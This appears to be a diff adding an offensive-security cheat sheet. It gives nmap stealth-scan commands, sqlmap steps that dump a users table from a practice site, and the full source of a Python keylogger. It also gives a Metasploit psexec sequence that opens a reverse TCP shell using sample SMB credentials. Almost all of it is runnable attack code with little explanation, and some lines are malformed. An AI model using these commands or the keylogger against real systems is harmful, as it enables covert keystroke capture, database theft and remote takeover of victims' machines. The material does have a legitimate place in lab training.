@@ -1,0 +1,48 @@
+
+NMAP PERFORM PORT SCANNING:
+
+ACK: nmap -sA -T4 scanme.nmap.org
+SYN: nmap -p22,113,139 scanme.nmap.org
+FIN: nmap -sF -T4 para
+NUll: nmap –sN –p 22 scanme.nmap.org
+XMAS: nmap -sX -T4 scanme.nmap.org
+
+SQL INJECTION ATTACK:
+-perform foll commands on root@kali-[~]#
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1
+
+http://testphp.vulnweb.com/artists.php?artist=1 -dbs
+
+http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -tables
+
+http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -columns
+
+http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
+
+KEYLOGGER:
+
+from pynput.keyboard import Key, Listener
+import logging
+# if no name it gets into an empty string
+log_dir = ""
+# This is a basic logging function
+logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s:')
+# This is from the library
+def on_press(key):
+	logging.info(str(key))
+# This says, listener is on
+with Listener(on_press=on_press) as listener:
+	listener.join()
+
+USE METASPLOIT TO EXPLOIT:
+Download and open metasploit and type foll commands:
+
+use exploit/windows/smb/psexec
+set RHOST 192.168.1.100
+set PAYLOAD windows/shell/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+set SMBUSER victim
+set SMBPASS s3cr3t
+exploit
